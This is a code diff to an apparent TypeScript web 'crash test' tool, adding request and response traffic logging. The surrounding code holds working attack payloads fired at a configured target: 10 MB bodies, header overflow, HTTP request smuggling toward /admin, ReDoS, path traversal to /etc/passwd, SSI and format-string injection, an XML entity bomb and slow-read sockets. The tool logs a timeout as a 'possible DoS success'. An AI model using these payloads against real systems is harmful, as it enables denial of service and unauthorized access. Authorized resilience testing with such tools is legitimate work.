@@ -21,6 +21,7 @@ export interface CrashTestJob {
   results: CrashTestResult[];
   intervals: NodeJS.Timeout[];
   sockets: net.Socket[];
+  trafficLog: string[];
 }
 
 export interface CrashTestResult {
@@ -45,20 +46,50 @@ function isCrashIndicator(code: number, body: string): boolean {
   return crash.some((k) => body.toLowerCase().includes(k));
 }
 
+function tsFmt() { return new Date().toISOString().slice(11, 23); }
+function pushLog(log: string[], lines: string[]) { log.push(...lines); if (log.length > 2000) log.splice(0, log.length - 2000); }
+
 function makeRequest(
   opts: http.RequestOptions,
   body: string | Buffer | null,
   isHttps: boolean,
+  trafficLog: string[],
   onResult: (result: Partial<CrashTestResult>) => void
 ) {
   const mod = isHttps ? https : http;
   const start = Date.now();
+  const ts = tsFmt();
+  const method = opts.method ?? "GET";
+  const path = String(opts.path ?? "/");
+  const hostname = String(opts.hostname ?? "");
+  const port = opts.port;
+  const reqLines = [
+    `[${ts}] ─── CRASH PROBE ────────────────────────────────────`,
+    `[${ts}] → ${method} ${path} HTTP/1.1`,
+    `[${ts}] → Host: ${hostname}:${port}`,
+    ...Object.entries(opts.headers ?? {}).map(([k, v]) => `[${ts}] → ${k}: ${v}`),
+    `[${ts}] →`,
+  ];
+  if (body) {
+    const preview = Buffer.isBuffer(body) ? `<binary ${body.length} bytes>` : String(body).slice(0, 200);
+    reqLines.push(`[${ts}] → ${preview}`);
+  }
+  pushLog(trafficLog, reqLines);
+
   const req = mod.request({ ...opts, rejectUnauthorized: false, timeout: 8000 }, (res) => {
     let data = "";
     res.on("data", (c: Buffer) => { data += c.toString().slice(0, 512); });
     res.on("end", () => {
       const rt = Date.now() - start;
       const crash = isCrashIndicator(res.statusCode ?? 0, data);
+      const ts2 = tsFmt();
+      pushLog(trafficLog, [
+        `[${ts2}] ← HTTP/1.1 ${res.statusCode} ${res.statusMessage ?? ""}`,
+        ...Object.entries(res.headers).map(([k, v]) => `[${ts2}] ← ${k}: ${Array.isArray(v) ? v.join(", ") : v}`),
+        `[${ts2}] ←`,
+        `[${ts2}] ← ${data.slice(0, 300).replace(/\r?\n/g, " ↵ ")}`,
+        `[${ts2}] • RTT: ${rt}ms ${crash ? "[ CRASH INDICATOR ]" : ""}`,
+      ]);
       onResult({
         status: crash ? "crash_indicator" : rt > 5000 ? "anomaly" : "sent",
         statusCode: res.statusCode,
@@ -67,8 +98,14 @@ function makeRequest(
       });
     });
   });
-  req.on("timeout", () => { req.destroy(); onResult({ status: "timeout", responseTime: 8000 }); });
-  req.on("error", (e) => { onResult({ status: "error", detail: e.message }); });
+  req.on("timeout", () => {
+    pushLog(trafficLog, [`[${tsFmt()}] ! TIMEOUT 8000ms — possible DoS success`]);
+    req.destroy(); onResult({ status: "timeout", responseTime: 8000 });
+  });
+  req.on("error", (e) => {
+    pushLog(trafficLog, [`[${tsFmt()}] ! CONNECTION ERROR: ${e.message}`]);
+    onResult({ status: "error", detail: e.message });
+  });
   if (body) req.write(body);
   req.end();
 }
@@ -80,7 +117,7 @@ export function startCrashTest(config: CrashTestConfig): CrashTestJob {
     id, config,
     startTime: now,
     endTime: now + config.duration * 1000,
-    active: true, results: [],
+    active: true, results: [], trafficLog: [],
     intervals: [], sockets: [],
   };
   jobs.set(id, job);
@@ -107,16 +144,16 @@ export function startCrashTest(config: CrashTestConfig): CrashTestJob {
   const TECHNIQUES: Record<string, () => void> = {
     "large-payload": () => {
       const body = "A".repeat(1024 * 1024 * 10);
-      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, (r) => addResult(r, "large-payload"));
+      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, job.trafficLog, (r) => addResult(r, "large-payload"));
     },
     "null-byte": () => {
       const path = config.path + "%00" + "A".repeat(256);
-      makeRequest({ ...baseOpts, path, method: "GET" }, null, isHttps, (r) => addResult(r, "null-byte"));
+      makeRequest({ ...baseOpts, path, method: "GET" }, null, isHttps, job.trafficLog, (r) => addResult(r, "null-byte"));
     },
     "header-overflow": () => {
       const headers: Record<string, string> = {};
       for (let i = 0; i < 100; i++) headers[`X-Custom-Header-${i}`] = "A".repeat(8192);
-      makeRequest({ ...baseOpts, path: config.path, method: "GET", headers }, null, isHttps, (r) => addResult(r, "header-overflow"));
+      makeRequest({ ...baseOpts, path: config.path, method: "GET", headers }, null, isHttps, job.trafficLog, (r) => addResult(r, "header-overflow"));
     },
     "http-smuggling": () => {
       const raw = `POST ${config.path} HTTP/1.1\r\nHost: ${config.target}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: ${config.target}\r\n\r\n`;
@@ -140,7 +177,7 @@ export function startCrashTest(config: CrashTestConfig): CrashTestJob {
     "redos": () => {
       const evil = "a".repeat(50) + "!";
       const body = `input=${encodeURIComponent(evil)}&pattern=${encodeURIComponent("(a+)+$")}`;
-      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, (r) => addResult(r, "redos"));
+      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, job.trafficLog, (r) => addResult(r, "redos"));
     },
     "path-traversal": () => {
       const paths = [
@@ -150,7 +187,7 @@ export function startCrashTest(config: CrashTestConfig): CrashTestJob {
         config.path + "/....//....//....//etc/passwd",
         config.path + "/%252e%252e%252fetc%252fpasswd",
       ];
-      paths.forEach((p) => makeRequest({ ...baseOpts, path: p, method: "GET" }, null, isHttps, (r) => addResult(r, "path-traversal")));
+      paths.forEach((p) => makeRequest({ ...baseOpts, path: p, method: "GET" }, null, isHttps, job.trafficLog, (r) => addResult(r, "path-traversal")));
     },
     "malformed-http": () => {
       const payloads = [
@@ -182,12 +219,12 @@ export function startCrashTest(config: CrashTestConfig): CrashTestJob {
       ];
       payloads.forEach((p) => {
         const body = `input=${encodeURIComponent(p)}`;
-        makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, (r) => addResult(r, "ssi-injection"));
+        makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, job.trafficLog, (r) => addResult(r, "ssi-injection"));
       });
     },
     "xml-bomb": () => {
       const bomb = `<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">]><root>&d;</root>`;
-      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/xml", "Content-Length": String(bomb.length) } }, bomb, isHttps, (r) => addResult(r, "xml-bomb"));
+      makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/xml", "Content-Length": String(bomb.length) } }, bomb, isHttps, job.trafficLog, (r) => addResult(r, "xml-bomb"));
     },
     "slow-read": () => {
       const sock = new net.Socket();
@@ -207,7 +244,7 @@ export function startCrashTest(config: CrashTestConfig): CrashTestJob {
       const payloads = ["%s%s%s%s%s%s%s%s%s%s", "%x%x%x%x%x%x", "%n%n%n%n%n%n", "%.2000d", "%1000000d"];
       payloads.forEach((p) => {
         const body = `input=${encodeURIComponent(p)}`;
-        makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, (r) => addResult(r, "format-string"));
+        makeRequest({ ...baseOpts, path: config.path, method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded", "Content-Length": String(body.length) } }, body, isHttps, job.trafficLog, (r) => addResult(r, "format-string"));
       });
     },
   };
